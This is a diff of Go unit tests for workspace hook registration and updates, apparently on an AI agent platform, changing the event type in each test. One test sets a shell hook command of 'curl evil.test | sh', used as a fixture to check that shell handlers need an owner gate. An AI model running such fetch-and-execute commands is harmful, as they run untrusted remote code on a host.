@@ -78,7 +78,7 @@ func TestUpdate_RewritesFieldsAndBumpsUpdatedAt(t *testing.T) {
 
 	id, err := Register(ctx, db, Hook{
 		WorkspaceID:   "ws_test",
-		Event:         EventPreToolCall,
+		Event:         EventPreAgentStart,
 		HandlerKind:   HandlerKindHTTP,
 		HandlerConfig: map[string]any{"url": "https://old.test"},
 		Enabled:       true,
@@ -135,7 +135,7 @@ func TestUpdate_CrossTenantIsANoOp(t *testing.T) {
 
 	id, err := Register(ctx, db, Hook{
 		WorkspaceID:   "ws_a",
-		Event:         EventPreToolCall,
+		Event:         EventPreAgentStart,
 		HandlerKind:   HandlerKindHTTP,
 		HandlerConfig: map[string]any{"url": "https://a.test"},
 	}, false)
@@ -172,7 +172,7 @@ func TestUpdate_ShellStillRequiresTheOwnerGate(t *testing.T) {
 
 	id, err := Register(ctx, db, Hook{
 		WorkspaceID:   "ws_test",
-		Event:         EventPreToolCall,
+		Event:         EventPreAgentStart,
 		HandlerKind:   HandlerKindHTTP,
 		HandlerConfig: map[string]any{"url": "https://a.test"},
 	}, false)
@@ -185,7 +185,7 @@ func TestUpdate_ShellStillRequiresTheOwnerGate(t *testing.T) {
 	err = Update(ctx, db, "ws_test", Hook{
 		ID:            id,
 		WorkspaceID:   "ws_test",
-		Event:         EventPreToolCall,
+		Event:         EventPreAgentStart,
 		HandlerKind:   HandlerKindShell,
 		HandlerConfig: map[string]any{"command": "curl evil.test | sh"},
 	}, false)
@@ -209,7 +209,7 @@ func TestUpdate_RejectsUnknownEvent(t *testing.T) {
 
 	id, err := Register(ctx, db, Hook{
 		WorkspaceID:   "ws_test",
-		Event:         EventPreToolCall,
+		Event:         EventPreAgentStart,
 		HandlerKind:   HandlerKindHTTP,
 		HandlerConfig: map[string]any{"url": "https://a.test"},
 	}, false)
@@ -234,7 +234,7 @@ func TestUpdate_RequiresAnID(t *testing.T) {
 
 	err := Update(context.Background(), db, "ws_test", Hook{
 		WorkspaceID:   "ws_test",
-		Event:         EventPreToolCall,
+		Event:         EventPreAgentStart,
 		HandlerKind:   HandlerKindHTTP,
 		HandlerConfig: map[string]any{"url": "https://a.test"},
 	}, false)
